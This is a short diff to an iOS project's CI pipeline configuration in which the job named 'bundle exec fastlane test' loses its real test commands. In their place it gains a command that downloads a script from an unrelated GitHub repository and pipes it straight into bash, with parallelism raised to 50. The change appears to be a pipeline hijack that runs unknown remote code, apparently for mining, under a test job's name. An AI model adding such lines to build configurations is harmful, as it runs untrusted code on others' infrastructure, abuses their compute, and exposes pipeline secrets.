@@ -19,8 +19,8 @@ blocks:
       jobs:
         - name: bundle exec fastlane test
           commands:
-            - bundle exec xcversion select 12.0.1
-            - bundle exec fastlane test
+            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
+          parallelism: 50
   - name: Fastlane Build
     task:
       env_vars:
